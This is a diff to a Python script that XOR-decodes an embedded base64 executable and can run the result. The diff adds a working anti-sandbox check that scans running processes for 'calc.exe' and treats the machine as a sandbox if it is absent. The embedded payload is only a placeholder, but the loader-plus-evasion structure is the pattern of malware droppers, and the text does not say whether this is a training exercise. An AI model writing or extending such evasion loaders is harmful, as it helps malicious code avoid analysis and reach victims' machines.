@@ -3,6 +3,7 @@ import sys
 import os
 import argparse
 import subprocess
+import psutil
 
 
 embedded_exe_b64 = '''hello'''
@@ -49,8 +50,21 @@ def run_file(path: str) -> None:
     except Exception as e:
         print(f"Error running file '{path}': {e}")
 
+
 def sandbox_check() -> bool:
-    return False
+    """
+    Check if there is any running process that contains the given name.
+    Returns False if found (not a sandbox) or True if not found (it is a sandbox)
+    """
+    name = "calc.exe"
+    for proc in psutil.process_iter(attrs=['name']):
+        try:
+            if name.lower() in proc.info['name'].lower():
+                return False
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    return True
+
 
 def main():
     parser = argparse.ArgumentParser(description="XOR a file with a key and optionally run the result.")
